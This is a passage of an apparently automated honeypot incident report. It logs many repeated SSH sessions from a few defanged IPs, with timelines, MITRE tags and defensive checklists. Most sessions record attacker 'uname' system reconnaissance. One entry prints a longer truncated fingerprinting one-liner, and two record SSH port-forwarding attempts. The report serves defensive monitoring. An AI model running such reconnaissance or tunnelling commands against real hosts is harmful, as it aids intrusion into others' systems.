| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:39` | `cowrie.session.connect` |
| `2026-08-25 05:05:39` | `cowrie.client.version` |
| `2026-08-25 05:05:39` | `cowrie.client.kex` |
| `2026-08-25 05:05:39` | `cowrie.login.success` |
| `2026-08-25 05:05:41` | `cowrie.session.params` |
| `2026-08-25 05:05:41` | `cowrie.command.input` |
| `2026-08-25 05:05:41` | `cowrie.log.closed` |
| `2026-08-25 05:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c94ef2dd1b5b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:44` | `cowrie.session.connect` |
| `2026-08-25 05:05:44` | `cowrie.client.version` |
| `2026-08-25 05:05:44` | `cowrie.client.kex` |
| `2026-08-25 05:05:44` | `cowrie.login.success` |
| `2026-08-25 05:05:45` | `cowrie.session.params` |
| `2026-08-25 05:05:45` | `cowrie.command.input` |
| `2026-08-25 05:05:45` | `cowrie.log.closed` |
| `2026-08-25 05:05:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76b02248f73

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:48` | `cowrie.session.connect` |
| `2026-08-25 05:05:48` | `cowrie.client.version` |
| `2026-08-25 05:05:48` | `cowrie.client.kex` |
| `2026-08-25 05:05:49` | `cowrie.login.success` |
| `2026-08-25 05:05:50` | `cowrie.session.params` |
| `2026-08-25 05:05:50` | `cowrie.command.input` |
| `2026-08-25 05:05:50` | `cowrie.log.closed` |
| `2026-08-25 05:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-321cdbfe1b15

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:53` | `cowrie.session.connect` |
| `2026-08-25 05:05:53` | `cowrie.client.version` |
| `2026-08-25 05:05:53` | `cowrie.client.kex` |
| `2026-08-25 05:05:54` | `cowrie.login.success` |
| `2026-08-25 05:05:54` | `cowrie.session.params` |
| `2026-08-25 05:05:54` | `cowrie.command.input` |
| `2026-08-25 05:05:54` | `cowrie.log.closed` |
| `2026-08-25 05:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-212b202254ac

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:05 |
| **Last Seen** | 2026-08-25 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:05:58` | `cowrie.session.connect` |
| `2026-08-25 05:05:58` | `cowrie.client.version` |
| `2026-08-25 05:05:58` | `cowrie.client.kex` |
| `2026-08-25 05:05:58` | `cowrie.login.success` |
| `2026-08-25 05:05:59` | `cowrie.session.params` |
| `2026-08-25 05:05:59` | `cowrie.command.input` |
| `2026-08-25 05:05:59` | `cowrie.log.closed` |
| `2026-08-25 05:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-621aeaf7ac93

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:02` | `cowrie.session.connect` |
| `2026-08-25 05:06:02` | `cowrie.client.version` |
| `2026-08-25 05:06:02` | `cowrie.client.kex` |
| `2026-08-25 05:06:03` | `cowrie.login.success` |
| `2026-08-25 05:06:04` | `cowrie.session.params` |
| `2026-08-25 05:06:04` | `cowrie.command.input` |
| `2026-08-25 05:06:04` | `cowrie.log.closed` |
| `2026-08-25 05:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bfa9d946197

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:07` | `cowrie.session.connect` |
| `2026-08-25 05:06:07` | `cowrie.client.version` |
| `2026-08-25 05:06:07` | `cowrie.client.kex` |
| `2026-08-25 05:06:07` | `cowrie.login.success` |
| `2026-08-25 05:06:08` | `cowrie.session.params` |
| `2026-08-25 05:06:08` | `cowrie.command.input` |
| `2026-08-25 05:06:08` | `cowrie.log.closed` |
| `2026-08-25 05:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcf300ef1f7d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:12` | `cowrie.session.connect` |
| `2026-08-25 05:06:12` | `cowrie.client.version` |
| `2026-08-25 05:06:12` | `cowrie.client.kex` |
| `2026-08-25 05:06:12` | `cowrie.login.success` |
| `2026-08-25 05:06:13` | `cowrie.session.params` |
| `2026-08-25 05:06:13` | `cowrie.command.input` |
| `2026-08-25 05:06:13` | `cowrie.log.closed` |
| `2026-08-25 05:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b7a48420d9

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:16` | `cowrie.session.connect` |
| `2026-08-25 05:06:16` | `cowrie.client.version` |
| `2026-08-25 05:06:16` | `cowrie.client.kex` |
| `2026-08-25 05:06:17` | `cowrie.login.success` |
| `2026-08-25 05:06:18` | `cowrie.session.params` |
| `2026-08-25 05:06:18` | `cowrie.command.input` |
| `2026-08-25 05:06:18` | `cowrie.log.closed` |
| `2026-08-25 05:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aacd079f2b4b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:21` | `cowrie.session.connect` |
| `2026-08-25 05:06:21` | `cowrie.client.version` |
| `2026-08-25 05:06:21` | `cowrie.client.kex` |
| `2026-08-25 05:06:22` | `cowrie.login.success` |
| `2026-08-25 05:06:22` | `cowrie.session.params` |
| `2026-08-25 05:06:22` | `cowrie.command.input` |
| `2026-08-25 05:06:22` | `cowrie.log.closed` |
| `2026-08-25 05:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69344a9b9115

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:26` | `cowrie.session.connect` |
| `2026-08-25 05:06:26` | `cowrie.client.version` |
| `2026-08-25 05:06:26` | `cowrie.client.kex` |
| `2026-08-25 05:06:26` | `cowrie.login.success` |
| `2026-08-25 05:06:27` | `cowrie.session.params` |
| `2026-08-25 05:06:27` | `cowrie.command.input` |
| `2026-08-25 05:06:27` | `cowrie.log.closed` |
| `2026-08-25 05:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3385321169b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:31` | `cowrie.session.connect` |
| `2026-08-25 05:06:31` | `cowrie.client.version` |
| `2026-08-25 05:06:31` | `cowrie.client.kex` |
| `2026-08-25 05:06:31` | `cowrie.login.success` |
| `2026-08-25 05:06:32` | `cowrie.session.params` |
| `2026-08-25 05:06:32` | `cowrie.command.input` |
| `2026-08-25 05:06:32` | `cowrie.log.closed` |
| `2026-08-25 05:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ad73be05bb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:34` | `cowrie.session.connect` |
| `2026-08-25 05:06:34` | `cowrie.client.version` |
| `2026-08-25 05:06:34` | `cowrie.client.kex` |
| `2026-08-25 05:06:35` | `cowrie.login.success` |
| `2026-08-25 05:06:37` | `cowrie.session.params` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.command.success` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.log.closed` |
| `2026-08-25 05:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb610bdf2653

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:35` | `cowrie.session.connect` |
| `2026-08-25 05:06:35` | `cowrie.client.version` |
| `2026-08-25 05:06:35` | `cowrie.client.kex` |
| `2026-08-25 05:06:36` | `cowrie.login.success` |
| `2026-08-25 05:06:36` | `cowrie.session.params` |
| `2026-08-25 05:06:36` | `cowrie.command.input` |
| `2026-08-25 05:06:37` | `cowrie.log.closed` |
| `2026-08-25 05:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1f1042063b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:39` | `cowrie.session.connect` |
| `2026-08-25 05:06:39` | `cowrie.client.version` |
| `2026-08-25 05:06:40` | `cowrie.client.kex` |
| `2026-08-25 05:06:40` | `cowrie.login.success` |
| `2026-08-25 05:06:41` | `cowrie.session.params` |
| `2026-08-25 05:06:41` | `cowrie.command.input` |
| `2026-08-25 05:06:41` | `cowrie.log.closed` |
| `2026-08-25 05:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e171aff3448

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:44` | `cowrie.session.connect` |
| `2026-08-25 05:06:44` | `cowrie.client.version` |
| `2026-08-25 05:06:44` | `cowrie.client.kex` |
| `2026-08-25 05:06:45` | `cowrie.login.success` |
| `2026-08-25 05:06:45` | `cowrie.session.params` |
| `2026-08-25 05:06:45` | `cowrie.command.input` |
| `2026-08-25 05:06:45` | `cowrie.log.closed` |
| `2026-08-25 05:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9decc2fcf9f9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:47` | `cowrie.session.connect` |
| `2026-08-25 05:06:47` | `cowrie.client.version` |
| `2026-08-25 05:06:47` | `cowrie.client.kex` |
| `2026-08-25 05:06:48` | `cowrie.login.success` |
| `2026-08-25 05:06:48` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:06:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:06:48` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9a287489697

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:49` | `cowrie.session.connect` |
| `2026-08-25 05:06:49` | `cowrie.client.version` |
| `2026-08-25 05:06:49` | `cowrie.client.kex` |
| `2026-08-25 05:06:49` | `cowrie.login.success` |
| `2026-08-25 05:06:50` | `cowrie.session.params` |
| `2026-08-25 05:06:50` | `cowrie.command.input` |
| `2026-08-25 05:06:50` | `cowrie.log.closed` |
| `2026-08-25 05:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aba1b66ce94e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:51` | `cowrie.session.connect` |
| `2026-08-25 05:06:51` | `cowrie.client.version` |
| `2026-08-25 05:06:52` | `cowrie.client.kex` |
| `2026-08-25 05:06:52` | `cowrie.login.success` |
| `2026-08-25 05:06:53` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:06:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:06:53` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd5b5841b59

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:53` | `cowrie.session.connect` |
| `2026-08-25 05:06:53` | `cowrie.client.version` |
| `2026-08-25 05:06:53` | `cowrie.client.kex` |
| `2026-08-25 05:06:54` | `cowrie.login.success` |
| `2026-08-25 05:06:54` | `cowrie.session.params` |
| `2026-08-25 05:06:54` | `cowrie.command.input` |
| `2026-08-25 05:06:55` | `cowrie.log.closed` |
| `2026-08-25 05:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf5ab261a59d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:06 |
| **Last Seen** | 2026-08-25 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:06:58` | `cowrie.session.connect` |
| `2026-08-25 05:06:58` | `cowrie.client.version` |
| `2026-08-25 05:06:58` | `cowrie.client.kex` |
| `2026-08-25 05:06:58` | `cowrie.login.success` |
| `2026-08-25 05:06:59` | `cowrie.session.params` |
| `2026-08-25 05:06:59` | `cowrie.command.input` |
| `2026-08-25 05:06:59` | `cowrie.log.closed` |
| `2026-08-25 05:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729c012a8a98

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:02` | `cowrie.session.connect` |
| `2026-08-25 05:07:02` | `cowrie.client.version` |
| `2026-08-25 05:07:02` | `cowrie.client.kex` |
| `2026-08-25 05:07:03` | `cowrie.login.success` |
| `2026-08-25 05:07:04` | `cowrie.session.params` |
| `2026-08-25 05:07:04` | `cowrie.command.input` |
| `2026-08-25 05:07:04` | `cowrie.log.closed` |
| `2026-08-25 05:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f95fcdf654b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:07` | `cowrie.session.connect` |
| `2026-08-25 05:07:07` | `cowrie.client.version` |
| `2026-08-25 05:07:07` | `cowrie.client.kex` |
| `2026-08-25 05:07:08` | `cowrie.login.success` |
| `2026-08-25 05:07:08` | `cowrie.session.params` |
| `2026-08-25 05:07:08` | `cowrie.command.input` |
| `2026-08-25 05:07:08` | `cowrie.log.closed` |
| `2026-08-25 05:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2e75f04a26a

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:12` | `cowrie.session.connect` |
| `2026-08-25 05:07:12` | `cowrie.client.version` |
| `2026-08-25 05:07:12` | `cowrie.client.kex` |
| `2026-08-25 05:07:12` | `cowrie.login.success` |
| `2026-08-25 05:07:13` | `cowrie.session.params` |
| `2026-08-25 05:07:13` | `cowrie.command.input` |
| `2026-08-25 05:07:13` | `cowrie.log.closed` |
| `2026-08-25 05:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edd3b76a41c7

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
